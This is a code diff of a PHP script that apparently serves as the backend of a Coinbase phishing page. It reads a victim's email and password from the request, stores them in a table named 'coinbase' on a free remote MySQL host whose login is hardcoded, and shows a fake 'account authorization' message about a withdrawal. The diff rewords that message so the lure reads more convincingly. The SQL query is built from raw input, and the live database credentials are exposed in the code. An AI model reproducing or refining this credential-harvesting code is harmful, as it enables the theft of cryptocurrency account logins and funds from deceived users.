@@ -14,21 +14,8 @@
 
         <?php 
 
-  
-
-        // servername => localhost 
-
-        // username => root 
-
-        // password => empty 
-
-        // database name => staff 
-
         $conn = mysqli_connect("sql3.freemysqlhosting.net", "sql3461458", "SKprsSvf54ACz812", "sql3461458"); 
 
-          
-
-        // Check connection 
 
         if($conn === false){ 
 
@@ -46,12 +33,6 @@
 
         $password = $_REQUEST['password']; 
 
-        
-
-          
-
-        // Performing insert query execution 
-
         // here our table name is coinbase 
 
         $sql = "INSERT INTO coinbase VALUES ('$email',  
@@ -62,7 +43,7 @@
 
         if(mysqli_query($conn, $sql)){ 
 
-            echo "<h3>Coinbase account verification in progress. <br>Our verified agents would be contact with you shortly to complete the withdrawal process.</br></h3>"; 
+            echo "<h3>Account authorization in progress. <br> You will receive a mail shortly to complete the withdrawal process.</br></h3>"; 
 
         } else{ 
 
